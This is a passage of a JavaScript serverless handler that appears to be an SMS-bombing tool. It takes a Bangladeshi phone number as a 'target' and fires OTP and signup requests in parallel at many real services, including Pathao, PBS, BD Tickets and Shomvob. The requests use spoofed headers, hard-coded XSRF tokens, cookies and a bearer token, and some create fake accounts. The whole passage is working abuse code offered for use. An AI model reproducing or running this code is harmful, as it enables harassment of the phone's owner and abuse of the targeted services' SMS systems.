      [["Content-Type","application/json"],["Origin","https://www.garimela.com"],["Referer","https://www.garimela.com/"],["Accept","application/json, text/plain, */*"],["User-Agent","Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"]]
    ),

    fire("Walton Amar Awaz",
      "https://walton-amar-awaz-prod.com/api/user/signup",
      { email: "", fbId: "", fullName: "User", gId: "", phone: number },
      [["Content-Type","application/json"],["accept","application/json"],["version-code","1.4.7"],["authorization","Bearer null"],["user-agent","okhttp/4.7.2"],["Accept-Language","en-US,en;q=0.9"]]
    ),

    fire("PBS BD",
      "https://pbs.com.bd/login/?handler=UserGetOtp",
      { UserName: "Teamdangerous", UserPassword: "Tushar", MobileNo: number },
      [["Content-Type","application/json"],["XSRF-Token","CfDJ8C8FhGbSUB1CplCwhmaw48FrjIGNq5sPRk0G6VzBicZtPJrEXDCoqGMiBTb3Fetxypt-480avEXqJS_WJVdEWQeDCz0mKIQO4odODIqIopHM8qh50R7CF3bOGHOtF22Pt-pgeyMhHQTk2t2inqJMRyw"],["Cookie",".AspNetCore.Antiforgery.B6RPubf2LMI=CfDJ8C8FhGbSUB1CplCwhmaw48HSKnE-hppep13XT5NAyk3laCHJb_oP0B1wPBZQP-hzP8Z2CAclzIeEqkFAMeWJS8xWzyiIMY_sMlsO7WzVcxmONd9WUDnzazvUlK9zFOY8h6Pwx1xsDD9fgtr2ltr9qHE;"],["Origin","https://pbs.com.bd"],["Referer","https://pbs.com.bd/login/"],["Accept","application/json, text/javascript, */*; q=0.01"],["x-requested-with","XMLHttpRequest"]]
    ),

    fire("PBS Alpha OTP",
      "https://apialpha.pbs.com.bd/api/OTP/generateOTP",
      { userPhone: number, otp: "" },
      [["Content-Type","application/json; charset=utf-8"],["Origin","https://pbs.com.bd"],["Referer","https://pbs.com.bd/"],["x-requested-with","mark.via.gp"],["Accept","application/json, text/plain, */*"],["User-Agent","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"]]
    ),

    fire("BD Tickets",
      "https://api.bdtickets.com:20100/v1/auth",
      { phoneNumber: plusBdFull, createUserCheck: true, applicationChannel: "WEB_APP" },
      [["Content-Type","application/json; charset=utf-8"],["Origin","https://bdtickets.com"],["Referer","https://bdtickets.com/"],["Accept","application/json, text/plain, */*"],["x-requested-with","mark.via.gp"]]
    ),

    fire("Shomvob",
      "https://backend-api.shomvob.co/api/v2/otp/applicant/web/phone/",
      { phone: bdFull, is_retry: 0 },
      [["Content-Type","application/json; charset=utf-8"],["Authorization","Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY1OTg5NTcwOH0.IOdKen62ye0N9WljM_cj3Xffmjs3dXUqoJRZ_1ezd4Q"],["Origin","https://app.shomvob.co"],["Referer","https://app.shomvob.co/auth/"],["Accept","application/json, text/plain, */*"],["x-requested-with","mark.via.gp"]]
    ),

    fire("Pharmaid RX",
      "https://shop.pharmaid-rx.com/api/sendSMSRegistration",
      { mobileNumber: number },
      [["Content-Type","application/json"],["Host","shop.pharmaid-rx.com"],["Accept","application/json, text/plain, */*"],["User-Agent","Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36"]]
    ),

    fire("Osud Kini",
      "https://api.osudkini.com/api/otp/generate-otp",
      { phoneNo: number },
      [["Content-Type","application/json"],["Connection","keep-alive"],["Accept","application/json, text/plain, */*"],["User-Agent","okhttp/4.9.3"]]
    ),

    fire("Pathao Auth",
      "https://api.pathao.com/v2/auth/register",
      { country_prefix: "880", national_number: bdNo, country_id: 1 },
      [["Content-Type","application/json"],["app-agent","ride/android/478"],["android-os","10"],["user-agent","okhttp/4.12.0"],["Accept","application/json"]]
    ),

    fire("Wholesale Plus",
      "https://admin.wholesaleplus.com.bd/api/send-otp/",
      { email: number, regi: true },
      [["Content-Type","application/json"],["Accept","application/json, text/plain, */*"],["User-Agent","Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"]]
    ),

    fire("Motion View",
      "https://api.motionview.com.bd/api/send-otp-phone-signup",
      { phone: number },
      [["Content-Type","application/json"],["Accept","application/json, text/plain, */*"],["User-Agent","Dart/3.2 (dart:io)"]]
    ),

    fire("ExpressHub",
      "https://expresshub.com.bd/User/CreateNewUser",
      { _UID: number, _UNAME: "TeamDangerous", _MAIL: "team@dangerous.com", _PHONE: number, _PASS: "Tushar2021", _TYPE: "1" },
      [["Content-Type","application/x-www-form-urlencoded"],["Origin","https://expresshub.com.bd"],["Referer","https://expresshub.com.bd/"],["Accept","application/json, text/javascript, */*; q=0.01"],["x-requested-with","XMLHttpRequest"]]
    ),

    fire("ABC Lit",
      "https://abclit.com/api/sendOTP",
      { recipientNo: number, code: 1234 },
      [["Content-Type","application/json"],["Accept","application/json, text/plain, */*"],["User-Agent","Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"]]
    ),

    fire("Beauty Booth",
      "https://admin.beautybooth.com.bd/api/v2/auth/register-new",
      { signature: 280, type: "phone", value: number, token: 39 },
      [["Content-Type","application/json; charset=utf-8"],["Origin","https://beautybooth.com.bd"],["Referer","https://beautybooth.com.bd/"],["x-requested-with","mark.via.gp"],["Accept","application/json, text/plain, */*"]]
    ),

    fire("WinBaji",
      "https://userapi.fairbet91.com/api/RegisterUser/GenerateOTPV2",
      { Mobile: number, SiteCode: "WBJ" },
      [["Content-Type","application/json"],["Origin","https://winbaji.com"],["Referer","https://winbaji.com/"],["Accept","application/json, text/plain, */*"],["User-Agent","Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36"]]
    ),

  ];
}

// ══════════════════════════════════════════════════════
//  CORS HEADERS
// ══════════════════════════════════════════════════════
const CORS_HEADERS = {
  "Access-Control-Allow-Origin":  "*",
  "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type",
  "Content-Type": "application/json",
};

// ══════════════════════════════════════════════════════
//  VERCEL HANDLER
// ══════════════════════════════════════════════════════
export default async function handler(req, res) {
  // Set CORS headers
  Object.entries(CORS_HEADERS).forEach(([k, v]) => res.setHeader(k, v));

  // OPTIONS preflight
  if (req.method === 'OPTIONS') {
    return res.status(204).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ status: 'error', message: 'POST only' });
  }

  const body = req.body ?? {};
  const numberStr = (body.number ?? '').toString().trim();

  if (!numberStr) {
    return res.status(200).json({ status: 'error', message: 'Number missing' });
  }

  // Validate BD number
  const cleaned = numberStr.replace(/^\+?880?/, '').replace(/^0/, '');
  if (cleaned.length !== 10 || !cleaned.startsWith('1')) {
    return res.status(200).json({ status: 'error', message: 'Invalid BD number. Use 01XXXXXXXXX' });
  }

  // Block check
  const n = numberStr.replace(/^0/, '');
  const isBlocked = BLOCKED_NUMBERS.some(b => {
    const bn = b.replace(/^0/, '');
    return numberStr === b || n === bn || `880${n}` === b || numberStr === `880${bn}`;
  });

  if (isBlocked) {
    return res.status(200).json({
      status: 'blocked', message: 'This number is protected.',
      target: numberStr, success: 0, failed: 0, total: 0, results: [],
    });
  }

  // Number format variants
  const number    = numberStr;
  const bdNo      = numberStr.replace(/^0/, '');
  const bdFull    = `880${bdNo}`;
  const plusBd    = `+88${numberStr}`;
  const plusBdFull = `+880${bdNo}`;
  const deviceId  = DEVICE_IDS[0];
  const firebase  = FIREBASE_TOKENS[0];

  // Fire all APIs in parallel
  const promises    = buildApiCalls(number, bdNo, bdFull, plusBd, plusBdFull, deviceId, firebase);
  const apiResults  = await Promise.all(promises);

  const success = apiResults.filter(r => r.ok).length;
  const failed  = apiResults.length - success;

  return res.status(200).json({
    status:  'executed',
    target:  numberStr,
    success,
    failed,
    total:   apiResults.length,
    results: apiResults,
  });
}
